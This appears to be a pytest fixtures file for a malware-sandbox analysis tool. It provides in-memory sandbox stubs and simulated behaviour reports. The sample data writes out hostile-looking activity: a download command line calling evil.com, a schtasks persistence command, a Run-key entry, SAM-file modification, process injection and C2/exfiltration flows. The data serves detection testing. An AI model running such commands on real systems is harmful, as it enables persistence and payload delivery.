# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Zachary Flint
#
# This file is part of Intellicrack. See LICENSE for details.

"""Shared fixtures and helpers for sandbox subsystem tests.

Provides in-memory sandbox implementations, stub managers, and
pre-built sample data fixtures that other test modules depend on.
"""

from __future__ import annotations

import tempfile
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final
from uuid import uuid4

import pytest

from intellicrack.bridges.sandbox_bridge import SandboxBridge
from intellicrack.sandbox.base import (
    ApiCall,
    ClipboardEvent,
    DllLoadEvent,
    ExecutionReport,
    FileChange,
    InjectionEvent,
    KernelObjectActivity,
    NetworkActivity,
    ProcessActivity,
    RegistryChange,
    ResourceSample,
    SandboxBase,
    SandboxConfig,
    SandboxError,
    SandboxState,
    ServiceChange,
)


TS_BASE: Final[str] = "2026-03-15T10:00:"
_VNC_PORT: Final[int] = 5900
_DEFAULT_PCAP_ID: Final[str] = "cap-001"
_SAMPLE_BINARY_SIZE: Final[int] = 4096
_SAMPLE_DLL_SIZE: Final[int] = 65536
_SAMPLE_CLIPBOARD_SIZE: Final[int] = 42
_TMPDIR: Final[Path] = Path(tempfile.gettempdir())


def ts_offset(second: int) -> str:
    """Build an ISO timestamp with the given second offset.

    Args:
        second: Second value (0-99) for the timestamp.

    Returns:
        str: ISO-formatted timestamp string.
    """
    return f"{TS_BASE}{second:02d}"


class QMPResponse:
    """Minimal QMP response object returned by StubQMP.

    Attributes:
        success: Whether the command succeeded.
        data: Response payload.
    """

    success: bool
    data: dict[str, Any]

    def __init__(
        self,
        *,
        success: bool = True,
        data: dict[str, Any] | None = None,
    ) -> None:
        """Initialise a QMP response.

        Args:
            success: Whether the command succeeded.
            data: Response payload (defaults to empty dict).
        """
        self.success = success
        self.data = data or {}


class StubQMP:
    """Minimal QMP client stub for QEMU-specific bridge paths."""

    async def cont(self) -> QMPResponse:
        """Resume VM execution.

        Returns:
            QMPResponse: Success response.
        """
        return QMPResponse(success=True, data={"status": "running"})


class AgentMessage:
    """Minimal guest agent message.

    Attributes:
        msg_type: Message type identifier.
        data: Message payload.
    """

    msg_type: str
    data: dict[str, Any]

    def __init__(self, msg_type: str, data: dict[str, Any] | None = None) -> None:
        """Initialise an agent message.

        Args:
            msg_type: Message type identifier.
            data: Message payload (defaults to empty dict).
        """
        self.msg_type = msg_type
        self.data = data or {}


class StubAgent:
    """Minimal guest agent stub for QEMU-specific bridge paths."""

    async def get_pending_messages(self) -> list[AgentMessage]:
        """Return sample pending messages.

        Returns:
            list[AgentMessage]: List containing one sample message.
        """
        return [AgentMessage("heartbeat", {"ts": ts_offset(0)})]


class InMemorySandbox(SandboxBase):
    """Concrete sandbox with in-memory implementations.

    Stores files, snapshots, and captures in memory for testing
    without any external sandbox dependencies.
    """

    def __init__(self, config: SandboxConfig | None = None) -> None:
        """Initialise the in-memory sandbox.

        Args:
            config: Optional sandbox configuration.
        """
        super().__init__(config)
        self._files: dict[str, bytes] = {}
        self._snapshots: dict[str, dict[str, bytes]] = {}
        self._pcap_captures: dict[str, list[bytes]] = {}

    @property
    def vnc_port(self) -> int | None:
        """Get the VNC port.

        Returns:
            int | None: Always 5900 for testing.
        """
        return _VNC_PORT

    async def is_available(self) -> bool:
        """Check availability.

        Returns:
            bool: Always True for in-memory sandbox.
        """
        return True

    async def start(self) -> None:
        """Start the sandbox, setting status to running."""
        self._state.status = "running"
        self._state.started_at = datetime.now(UTC)

    async def stop(self) -> None:
        """Stop the sandbox, setting status to stopped."""
        self._state.status = "stopped"

    async def run_command(
        self,
        command: str,
        time_limit: int | None = None,
        working_directory: str | None = None,
    ) -> tuple[int, str, str]:
        """Execute a command in the sandbox.

        Args:
            command: Command to execute.
            time_limit: Optional timeout override.
            working_directory: Optional working directory.

        Returns:
            tuple[int, str, str]: (exit_code, stdout, stderr).
        """
        del time_limit, working_directory
        return (0, f"ok: {command}", "")

    async def run_binary(
        self,
        binary_path: Path,
        args: list[str] | None = None,
        time_limit: int | None = None,
        *,
        monitor: bool = True,
    ) -> ExecutionReport:
        """Run a binary with realistic sample monitoring data.

        Args:
            binary_path: Path to the binary.
            args: Optional command line arguments.
            time_limit: Optional timeout override.
            monitor: Whether to monitor behavior.

        Returns:
            ExecutionReport: Report with sample monitoring data.
        """
        del args, time_limit, monitor
        return ExecutionReport(
            result="success",
            exit_code=0,
            stdout=f"Executed {binary_path.name}",
            stderr="",
            duration_seconds=1.5,
            file_changes=[
                FileChange(
                    path="C:\\Temp\\output.dat",
                    operation="created",
                    old_path=None,
                    timestamp=ts_offset(1),
                    size=_SAMPLE_BINARY_SIZE,
                ),
            ],
            network_activity=[
                NetworkActivity(
                    protocol="tcp",
                    direction="outbound",
                    local_address="192.168.1.100",
                    local_port=49152,
                    remote_address="203.0.113.50",
                    remote_port=443,
                    timestamp=ts_offset(2),
                    bytes_sent=256,
                    bytes_received=512,
                ),
            ],
        )

    async def copy_to_sandbox(self, source: Path, dest: str) -> None:
        """Copy a file into the in-memory sandbox.

        Args:
            source: Local source path.
            dest: Destination path in sandbox.
        """
        self._files[dest] = source.name.encode()

    async def copy_from_sandbox(self, source: str, dest: Path) -> None:
        """Copy a file from the in-memory sandbox.

        Args:
            source: Source path in sandbox.
            dest: Local destination path (unused; the in-memory backend has no real filesystem export).
        """
        del dest
        _ = self._files.get(source, b"")

    async def take_snapshot(self, name: str) -> str:
        """Take a snapshot of the sandbox state.

        Args:
            name: Snapshot name.

        Returns:
            str: Snapshot identifier.
        """
        snapshot_id = f"snap-{name}"
        self._snapshots[snapshot_id] = dict(self._files)
        return snapshot_id

    async def restore_snapshot(self, snapshot_id: str) -> None:
        """Restore a sandbox snapshot.

        Args:
            snapshot_id: Snapshot identifier.

        Raises:
            SandboxError: If snapshot not found.
        """
        if snapshot_id not in self._snapshots:
            msg = f"Snapshot not found: {snapshot_id}"
            raise SandboxError(msg)
        self._files = dict(self._snapshots[snapshot_id])

    async def list_snapshots(self) -> list[str]:
        """List available snapshots.

        Returns:
            list[str]: List of snapshot identifiers.
        """
        return list(self._snapshots.keys())

    async def delete_snapshot(self, name: str) -> None:
        """Delete a snapshot.

        Args:
            name: Snapshot name to delete.

        Raises:
            SandboxError: If snapshot not found.
        """
        key = f"snap-{name}"
        if key not in self._snapshots:
            msg = f"Snapshot not found: {key}"
            raise SandboxError(msg)
        del self._snapshots[key]

    async def start_pcap_capture(self) -> str:
        """Start packet capture.

        Returns:
            str: Capture identifier.
        """
        self._pcap_captures[_DEFAULT_PCAP_ID] = []
        return _DEFAULT_PCAP_ID

    async def stop_pcap_capture(
        self,
        capture_id: str,
        output_path: Path | None = None,
    ) -> Path:
        """Stop packet capture and return path.

        Args:
            capture_id: Capture identifier.
            output_path: Optional output path.

        Returns:
            Path: Path to the PCAP file.
        """
        del capture_id
        return output_path or (_TMPDIR / "capture.pcap")

    async def capture_screenshot(
        self,
        output_path: Path | None = None,
    ) -> Path:
        """Capture a screenshot.

        Args:
            output_path: Optional output path.

        Returns:
            Path: Path to the screenshot file.
        """
        return output_path or (_TMPDIR / "screenshot.png")

    async def apply_anti_evasion(
        self,
        profile: str = "default",
    ) -> dict[str, Any]:
        """Apply anti-evasion techniques.

        Args:
            profile: Anti-evasion profile name.

        Returns:
            dict[str, Any]: Dictionary of applied techniques.
        """
        return {"profile": profile, "techniques_applied": 5}

    async def dump_memory(
        self,
        output_path: Path | None = None,
        target_pid: int | None = None,
    ) -> Path:
        """Dump guest memory.

        Args:
            output_path: Optional output path.
            target_pid: Optional guest-side target PID (recorded for assertions).

        Returns:
            Path: Path to the memory dump file.
        """
        del target_pid
        return output_path or (_TMPDIR / "memdump.raw")

    async def extract_dropped_files(
        self,
        output_path: Path | None = None,
    ) -> Path:
        """Extract dropped files.

        Args:
            output_path: Optional output path.

        Returns:
            Path: Path to the ZIP archive.
        """
        return output_path or (_TMPDIR / "dropped.zip")

    async def yara_scan(
        self,
        rules_path: str | None = None,
        scan_target: str = "files",
    ) -> list[dict[str, Any]]:
        """Run YARA rules against artifacts.

        Args:
            rules_path: Path to YARA rules file.
            scan_target: What to scan ('files' or 'memory').

        Returns:
            list[dict[str, Any]]: List of YARA match results.
        """
        return [
            {
                "rule": "SuspiciousPE",
                "target": scan_target,
                "rules_file": rules_path or "builtin",
                "strings": ["MZ"],
            },
        ]


class InMemoryQEMUSandbox(InMemorySandbox):
    """In-memory sandbox with QEMU-specific stubs for bridge paths.

    Exposes public ``qmp`` and ``agent`` attributes that match the public
    property accessors on the real ``QEMUSandbox`` class so bridge code that
    reads them via ``getattr()`` finds working stubs.
    """

    def __init__(self, config: SandboxConfig | None = None) -> None:
        """Initialise the in-memory QEMU sandbox.

        Args:
            config: Optional sandbox configuration.
        """
        super().__init__(config)
        self.qmp = StubQMP()
        self.agent = StubAgent()


class StubInstance:
    """Minimal sandbox instance compatible with SandboxBridge expectations."""

    def __init__(
        self,
        sandbox: SandboxBase,
        sandbox_type: str,
        instance_id: str | None = None,
    ) -> None:
        """Initialise the stub instance.

        Args:
            sandbox: The sandbox implementation.
            sandbox_type: Type of sandbox ('windows' or 'qemu').
            instance_id: Optional fixed instance ID; a UUID is generated when omitted.
        """
        self.id = instance_id or str(uuid4())
        self.sandbox_type = sandbox_type
        self.sandbox = sandbox
        self.created_at = datetime.now(UTC)
        self.last_used = datetime.now(UTC)
        self.binary_path: Path | None = None
        self.last_report: ExecutionReport | None = None

    @property
    def state(self) -> SandboxState:
        """Get sandbox state.

        Returns:
            SandboxState: The sandbox's internal state object.
        """
        return self.sandbox.state

    def touch(self) -> None:
        """Update last used timestamp."""
        self.last_used = datetime.now(UTC)


class StubManager:
    """Stand-in for SandboxManager with pre-populated instances."""

    def __init__(
        self,
        instances: dict[str, StubInstance] | None = None,
    ) -> None:
        """Initialise the stub manager.

        Args:
            instances: Optional pre-populated instance dict.
        """
        self._instances: dict[str, StubInstance] = instances or {}

    @property
    def instances(self) -> list[StubInstance]:
        """Get all instances.

        Returns:
            list[StubInstance]: List of stub instances.
        """
        return list(self._instances.values())

    @property
    def active_count(self) -> int:
        """Get count of running instances.

        Returns:
            int: Number of running sandboxes.
        """
        return sum(inst.state.status == "running" for inst in self._instances.values())

    async def create(
        self,
        sandbox_type: str = "windows",
        config: SandboxConfig | None = None,
        binary_path: Path | None = None,
        qemu_config: object = None,
        *,
        auto_start: bool = True,
    ) -> StubInstance:
        """Create a new stub instance.

        Args:
            sandbox_type: Type of sandbox.
            config: Optional configuration.
            binary_path: Optional binary path.
            qemu_config: Optional QEMU config (kept as ``object`` for compatibility
                with callers that import ``QEMUConfig`` from sandbox.qemu).
            auto_start: Whether to auto-start.

        Returns:
            StubInstance: Created instance.
        """
        del config, qemu_config
        sandbox: SandboxBase
        sandbox = InMemoryQEMUSandbox() if sandbox_type == "qemu" else InMemorySandbox()

        if auto_start:
            await sandbox.start()

        inst = StubInstance(sandbox, sandbox_type)
        inst.binary_path = binary_path
        self._instances[inst.id] = inst
        return inst

    async def get(self, instance_id: str) -> StubInstance | None:
        """Get instance by ID.

        Args:
            instance_id: Instance identifier.

        Returns:
            StubInstance | None: Instance or None.
        """
        return self._instances.get(instance_id)

    async def destroy(self, instance_id: str) -> None:
        """Destroy an instance.

        Args:
            instance_id: Instance identifier.

        Raises:
            SandboxError: If instance not found.
        """
        if instance_id not in self._instances:
            msg = f"Instance not found: {instance_id}"
            raise SandboxError(msg)
        inst = self._instances.pop(instance_id)
        await inst.sandbox.stop()

    async def destroy_all(self) -> None:
        """Destroy all instances."""
        for inst in list(self._instances.values()):
            await inst.sandbox.stop()
        self._instances.clear()

    async def run_binary(
        self,
        binary_path: Path,
        args: list[str] | None = None,
        sandbox_type: str = "windows",
        config: SandboxConfig | None = None,
        time_limit: int | None = None,
        qemu_config: object = None,
        *,
        monitor: bool = True,
        reuse_instance: bool = False,
    ) -> tuple[StubInstance, ExecutionReport]:
        """Run a binary in a sandbox.

        Args:
            binary_path: Path to the binary.
            args: Optional command line arguments.
            sandbox_type: Type of sandbox.
            config: Optional configuration.
            time_limit: Optional timeout.
            qemu_config: Optional QEMU config (kept as ``object`` for compatibility
                with callers that import ``QEMUConfig`` from sandbox.qemu).
            monitor: Whether to monitor.
            reuse_instance: Whether to reuse an existing instance.

        Returns:
            tuple[StubInstance, ExecutionReport]: Instance and report.
        """
        del reuse_instance, config, qemu_config
        inst = await self.create(sandbox_type=sandbox_type, auto_start=True)
        inst.binary_path = binary_path
        report = await inst.sandbox.run_binary(
            binary_path=binary_path,
            args=args,
            time_limit=time_limit,
            monitor=monitor,
        )
        inst.last_report = report
        return (inst, report)

    async def get_status(self) -> dict[str, object]:
        """Get manager status.

        Returns:
            dict[str, object]: Status dictionary.
        """
        return {
            "available_types": await self.get_available_types(),
            "max_instances": 3,
            "active_count": self.active_count,
            "total_count": len(self._instances),
            "instances": [
                {
                    "id": inst.id,
                    "type": inst.sandbox_type,
                    "status": inst.state.status,
                    "created_at": inst.created_at.isoformat(),
                    "last_used": inst.last_used.isoformat(),
                    "binary": str(inst.binary_path) if inst.binary_path else None,
                }
                for inst in self._instances.values()
            ],
        }

    async def get_available_types(self) -> list[str]:
        """Get available sandbox types.

        Returns:
            list[str]: List of available types.
        """
        return ["windows", "qemu"]


def make_sample_report(
    network_activity: list[NetworkActivity] | None = None,
    file_changes: list[FileChange] | None = None,
    registry_changes: list[RegistryChange] | None = None,
    process_activity: list[ProcessActivity] | None = None,
    api_calls: list[ApiCall] | None = None,
    service_changes: list[ServiceChange] | None = None,
    injection_events: list[InjectionEvent] | None = None,
    clipboard_events: list[ClipboardEvent] | None = None,
    dll_loads: list[DllLoadEvent] | None = None,
    kernel_objects: list[KernelObjectActivity] | None = None,
    resource_samples: list[ResourceSample] | None = None,
) -> ExecutionReport:
    """Build an ExecutionReport from optional per-field lists.

    Args:
        network_activity: Optional network activity list.
        file_changes: Optional file changes list.
        registry_changes: Optional registry changes list.
        process_activity: Optional process activity list.
        api_calls: Optional API calls list.
        service_changes: Optional service changes list.
        injection_events: Optional injection events list.
        clipboard_events: Optional clipboard events list.
        dll_loads: Optional DLL load events list.
        kernel_objects: Optional kernel object events list.
        resource_samples: Optional resource sample list.

    Returns:
        ExecutionReport: A report combining all provided data.
    """
    return ExecutionReport(
        result="success",
        exit_code=0,
        stdout="sample output",
        stderr="",
        duration_seconds=5.0,
        network_activity=network_activity or [],
        file_changes=file_changes or [],
        registry_changes=registry_changes or [],
        process_activity=process_activity or [],
        api_calls=api_calls or [],
        service_changes=service_changes or [],
        injection_events=injection_events or [],
        clipboard_events=clipboard_events or [],
        dll_loads=dll_loads or [],
        kernel_objects=kernel_objects or [],
        resource_samples=resource_samples or [],
    )


@pytest.fixture
def in_memory_sandbox() -> InMemorySandbox:
    """Provide a started in-memory sandbox.

    Returns:
        InMemorySandbox: A sandbox instance with status 'running'.
    """
    sb = InMemorySandbox()
    sb.state.status = "running"
    return sb


@pytest.fixture
def sample_network_activity() -> list[NetworkActivity]:
    """Provide network activity covering beaconing, DGA, C2 ports, exfiltration, DoH, and normal traffic.

    Returns:
        list[NetworkActivity]: List of 10+ network activity entries.
    """
    beaconing: list[NetworkActivity] = [
        NetworkActivity(
            protocol="tcp",
            direction="outbound",
            local_address="192.168.1.100",
            local_port=49152,
            remote_address="10.0.0.1",
            remote_port=8443,
            timestamp=ts_offset(i * 60 % 100),
            bytes_sent=256,
            bytes_received=512,
        )
        for i in range(5)
    ]

    dga = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49153,
        remote_address="xkqwzjrtmnpv.evil.com",
        remote_port=80,
        timestamp=ts_offset(10),
        bytes_sent=128,
        bytes_received=64,
    )

    c2_port = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49154,
        remote_address="203.0.113.50",
        remote_port=4444,
        timestamp=ts_offset(15),
        bytes_sent=64,
        bytes_received=32,
    )

    exfil = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49155,
        remote_address="198.51.100.10",
        remote_port=443,
        timestamp=ts_offset(20),
        bytes_sent=5_242_880,
        bytes_received=100,
    )

    doh = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49156,
        remote_address="1.1.1.1",
        remote_port=443,
        timestamp=ts_offset(25),
        bytes_sent=128,
        bytes_received=256,
    )

    normal = NetworkActivity(
        protocol="tcp",
        direction="outbound",
        local_address="192.168.1.100",
        local_port=49157,
        remote_address="93.184.216.34",
        remote_port=80,
        timestamp=ts_offset(30),
        bytes_sent=200,
        bytes_received=400,
    )

    return [*beaconing, dga, c2_port, exfil, doh, normal]


@pytest.fixture
def sample_file_changes() -> list[FileChange]:
    """Provide sample file changes.

    Returns:
        list[FileChange]: Three file change entries.
    """
    return [
        FileChange(
            path="C:\\Temp\\payload.exe",
            operation="created",
            old_path=None,
            timestamp=ts_offset(1),
            size=_SAMPLE_BINARY_SIZE,
        ),
        FileChange(
            path="C:\\Windows\\System32\\config\\sam",
            operation="modified",
            old_path=None,
            timestamp=ts_offset(5),
            size=None,
        ),
        FileChange(
            path="C:\\Temp\\evidence.log",
            operation="deleted",
            old_path=None,
            timestamp=ts_offset(8),
            size=None,
        ),
    ]


@pytest.fixture
def sample_registry_changes() -> list[RegistryChange]:
    """Provide sample registry changes including a Run key.

    Returns:
        list[RegistryChange]: Three registry change entries.
    """
    return [
        RegistryChange(
            key="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
            value_name="Malware",
            operation="created",
            value_type="REG_SZ",
            value_data="C:\\Temp\\payload.exe",
            timestamp=ts_offset(2),
        ),
        RegistryChange(
            key="HKLM\\SOFTWARE\\TestApp\\Settings",
            value_name="admin@evil.com",
            operation="modified",
            value_type="REG_SZ",
            value_data="enabled",
            timestamp=ts_offset(6),
        ),
        RegistryChange(
            key="HKCU\\Software\\Classes\\test",
            value_name=None,
            operation="deleted",
            value_type=None,
            value_data=None,
            timestamp=ts_offset(9),
        ),
    ]


@pytest.fixture
def sample_process_activity() -> list[ProcessActivity]:
    """Provide sample process activity including discovery tools.

    Returns:
        list[ProcessActivity]: Four process activity entries.
    """
    return [
        ProcessActivity(
            pid=1000,
            name="whoami.exe",
            path="C:\\Windows\\System32\\whoami.exe",
            command_line="whoami /all",
            parent_pid=500,
            operation="created",
            exit_code=0,
            timestamp=ts_offset(3),
        ),
        ProcessActivity(
            pid=1001,
            name="schtasks.exe",
            path="C:\\Windows\\System32\\schtasks.exe",
            command_line="schtasks /create /tn test /tr C:\\Temp\\payload.exe /sc daily",
            parent_pid=500,
            operation="created",
            exit_code=0,
            timestamp=ts_offset(4),
        ),
        ProcessActivity(
            pid=1002,
            name="cmd.exe",
            path="C:\\Windows\\System32\\cmd.exe",
            command_line="cmd /c https://evil.com/dl.exe -o C:\\Temp\\out.exe",
            parent_pid=500,
            operation="created",
            exit_code=0,
            timestamp=ts_offset(7),
        ),
        ProcessActivity(
            pid=500,
            name="payload.exe",
            path="C:\\Temp\\payload.exe",
            command_line=None,
            parent_pid=100,
            operation="terminated",
            exit_code=1,
            timestamp=ts_offset(50),
        ),
    ]


@pytest.fixture
def sample_api_calls() -> list[ApiCall]:
    """Provide sample API calls including anti-debug and sleep.

    Returns:
        list[ApiCall]: Three API call entries.
    """
    return [
        ApiCall(
            timestamp=ts_offset(3),
            process_name="payload.exe",
            pid=500,
            api_name="IsDebuggerPresent",
            module="kernel32.dll",
            arguments=[],
            return_value="0",
        ),
        ApiCall(
            timestamp=ts_offset(4),
            process_name="payload.exe",
            pid=500,
            api_name="Sleep",
            module="kernel32.dll",
            arguments=["120000"],
            return_value="0",
        ),
        ApiCall(
            timestamp=ts_offset(5),
            process_name="payload.exe",
            pid=500,
            api_name="CreateFileW",
            module="kernel32.dll",
            arguments=["C:\\Temp\\output.dat", "GENERIC_WRITE"],
            return_value="0x100",
        ),
    ]


@pytest.fixture
def sample_service_changes() -> list[ServiceChange]:
    """Provide sample service changes.

    Returns:
        list[ServiceChange]: One service change entry.
    """
    return [
        ServiceChange(
            service_name="MalSvc",
            display_name="Malicious Service",
            binary_path="C:\\Temp\\payload.exe",
            start_type="auto",
            operation="created",
            timestamp=ts_offset(6),
        ),
    ]


@pytest.fixture
def sample_injection_events() -> list[InjectionEvent]:
    """Provide sample injection events.

    Returns:
        list[InjectionEvent]: One injection event entry.
    """
    return [
        InjectionEvent(
            timestamp=ts_offset(7),
            source_pid=500,
            source_name="payload.exe",
            target_pid=1234,
            target_name="explorer.exe",
            injection_type="CreateRemoteThread",
            api_calls=["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
        ),
    ]


@pytest.fixture
def sample_clipboard_events() -> list[ClipboardEvent]:
    """Provide sample clipboard events.

    Returns:
        list[ClipboardEvent]: Two clipboard events (read and write).
    """
    return [
        ClipboardEvent(
            timestamp=ts_offset(8),
            operation="read",
            format="CF_TEXT",
            content_preview="password123",
            size_bytes=_SAMPLE_CLIPBOARD_SIZE,
            pid=500,
            process_name="payload.exe",
        ),
        ClipboardEvent(
            timestamp=ts_offset(9),
            operation="write",
            format="CF_TEXT",
            content_preview="replaced",
            size_bytes=8,
            pid=500,
            process_name="payload.exe",
        ),
    ]


@pytest.fixture
def sample_dll_loads() -> list[DllLoadEvent]:
    """Provide sample DLL load events.

    Returns:
        list[DllLoadEvent]: One DLL load entry.
    """
    return [
        DllLoadEvent(
            timestamp=ts_offset(2),
            pid=500,
            process_name="payload.exe",
            dll_path="C:\\Windows\\System32\\kernel32.dll",
            base_address="0x7FFE0000",
            size=_SAMPLE_DLL_SIZE,
        ),
    ]


@pytest.fixture
def sample_kernel_objects() -> list[KernelObjectActivity]:
    """Provide sample kernel object activity.

    Returns:
        list[KernelObjectActivity]: One kernel object entry.
    """
    return [
        KernelObjectActivity(
            object_type="Mutex",
            name="Global\\MalwareMutex",
            pid=500,
            process_name="payload.exe",
            operation="created",
            timestamp=ts_offset(3),
        ),
    ]


@pytest.fixture
def sample_resource_samples() -> list[ResourceSample]:
    """Provide sample resource usage data.

    Returns:
        list[ResourceSample]: One resource sample entry.
    """
    return [
        ResourceSample(
            timestamp=ts_offset(5),
            cpu_percent=45.2,
            memory_mb=128.0,
            disk_read_bytes=1024,
            disk_write_bytes=2048,
            net_sent_bytes=256,
            net_recv_bytes=512,
        ),
    ]


@pytest.fixture
def sample_report(
    sample_network_activity: list[NetworkActivity],
    sample_file_changes: list[FileChange],
    sample_registry_changes: list[RegistryChange],
    sample_process_activity: list[ProcessActivity],
    sample_api_calls: list[ApiCall],
    sample_service_changes: list[ServiceChange],
    sample_injection_events: list[InjectionEvent],
    sample_clipboard_events: list[ClipboardEvent],
    sample_dll_loads: list[DllLoadEvent],
    sample_kernel_objects: list[KernelObjectActivity],
    sample_resource_samples: list[ResourceSample],
) -> ExecutionReport:
    """Provide a full ExecutionReport combining all sample fixtures.

    Args:
        sample_network_activity: Network activity data.
        sample_file_changes: File change data.
        sample_registry_changes: Registry change data.
        sample_process_activity: Process activity data.
        sample_api_calls: API call data.
        sample_service_changes: Service change data.
        sample_injection_events: Injection event data.
        sample_clipboard_events: Clipboard event data.
        sample_dll_loads: DLL load event data.
        sample_kernel_objects: Kernel object data.
        sample_resource_samples: Resource sample data.

    Returns:
        ExecutionReport: Full report with all monitoring data.
    """
    return make_sample_report(
        network_activity=sample_network_activity,
        file_changes=sample_file_changes,
        registry_changes=sample_registry_changes,
        process_activity=sample_process_activity,
        api_calls=sample_api_calls,
        service_changes=sample_service_changes,
        injection_events=sample_injection_events,
        clipboard_events=sample_clipboard_events,
        dll_loads=sample_dll_loads,
        kernel_objects=sample_kernel_objects,
        resource_samples=sample_resource_samples,
    )


@pytest.fixture
def empty_report() -> ExecutionReport:
    """Provide a minimal report with all lists empty.

    Returns:
        ExecutionReport: Report with no monitoring data.
    """
    return make_sample_report()


@pytest.fixture
def sandbox_bridge() -> SandboxBridge:
    """Provide a SandboxBridge with pre-populated windows and qemu instances.

    Both instances have ``last_report`` set with sample monitoring data.

    Returns:
        SandboxBridge: Configured bridge ready for testing.
    """
    bridge = SandboxBridge()

    win_sandbox = InMemorySandbox()
    win_sandbox.state.status = "running"
    win_inst = StubInstance(win_sandbox, "windows", instance_id="win-test-001")
    win_inst.last_report = ExecutionReport(
        result="success",
        exit_code=0,
        stdout="ok",
        stderr="",
        duration_seconds=2.0,
        file_changes=[
            FileChange(
                path="C:\\out.txt",
                operation="created",
                old_path=None,
                timestamp=ts_offset(1),
                size=100,
            ),
        ],
        network_activity=[
            NetworkActivity(
                protocol="tcp",
                direction="outbound",
                local_address="192.168.1.100",
                local_port=49152,
                remote_address="203.0.113.50",
                remote_port=443,
                timestamp=ts_offset(2),
                bytes_sent=256,
                bytes_received=512,
            ),
        ],
    )

    qemu_sandbox = InMemoryQEMUSandbox()
    qemu_sandbox.state.status = "running"
    qemu_inst = StubInstance(qemu_sandbox, "qemu", instance_id="qemu-test-001")
    qemu_inst.last_report = ExecutionReport(
        result="success",
        exit_code=0,
        stdout="ok",
        stderr="",
        duration_seconds=3.0,
    )

    manager = StubManager({
        "win-test-001": win_inst,
        "qemu-test-001": qemu_inst,
    })

    bridge._manager = manager  # type: ignore[assignment]
    return bridge


@pytest.fixture
def bridge_no_reports() -> SandboxBridge:
    """Provide a SandboxBridge with instances but no last_report.

    Returns:
        SandboxBridge: Bridge with instances lacking execution reports.
    """
    bridge = SandboxBridge()

    win_sandbox = InMemorySandbox()
    win_sandbox.state.status = "running"
    win_inst = StubInstance(win_sandbox, "windows", instance_id="win-noreport-001")

    qemu_sandbox = InMemoryQEMUSandbox()
    qemu_sandbox.state.status = "running"
    qemu_inst = StubInstance(qemu_sandbox, "qemu", instance_id="qemu-noreport-001")

    manager = StubManager({
        "win-noreport-001": win_inst,
        "qemu-noreport-001": qemu_inst,
    })

    bridge._manager = manager  # type: ignore[assignment]
    return bridge
